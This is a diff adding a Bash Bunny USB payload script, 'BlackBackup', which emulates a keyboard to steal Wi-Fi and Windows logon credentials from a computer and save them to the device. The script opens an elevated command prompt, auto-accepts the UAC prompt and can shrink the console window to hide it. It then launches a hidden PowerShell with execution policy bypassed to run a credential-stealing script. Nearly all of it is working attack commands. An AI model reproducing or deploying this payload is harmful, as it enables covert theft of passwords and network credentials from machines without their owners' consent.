@@ -1,0 +1,59 @@
+# Title:         BlackBackup
+# Author:        JWHeuver & JBaselier
+# Version:       1.0
+#
+# Runs powershell script to get Wlan and logon credentials
+# from computer and save them on USB drive (Storage attack)
+#
+# Purple.............Loading
+# Green .............Execute Credential Ripper Powershell
+# Off................Finished
+#
+#!/bin/bash
+
+# OPTIONS - More options available in the Powershell payload
+OBFUSCATECMD="N" # Y=yes or N=no
+
+#-----------------------------------
+# Purple LED - initializing
+LED SETUP
+
+GET SWITCH_POSITION
+
+# Attackmode HID / Storage
+ATTACKMODE HID STORAGE
+
+#-----------------------------------
+# Green LED - executing credential_powershell
+LED STAGE1
+
+QUACK GUI r
+QUACK DELAY 300
+QUACK STRING powershell Start-Process cmd -Verb runAs
+QUACK ENTER
+QUACK DELAY 4000
+QUACK ALT y
+QUACK ALT j
+QUACK ENTER
+QUACK DELAY 1000
+
+# Obfuscate CMD?
+if [ $OBFUSCATECMD == "Y" ]; then
+	QUACK STRING mode con:cols=20 lines=1
+	QUACK ENTER
+	QUACK DELAY 100
+	QUACK STRING color FE
+	QUACK ENTER
+	QUACK DELAY 100
+fi
+
+# Execute Attack
+QUACK STRING powerShell -windowstyle hidden -ExecutionPolicy Bypass ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\credentials.ps1')"
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING exit
+QUACK ENTER
+
+#-----------------------------------
+# Kill the lights - finished
+LED FINISH
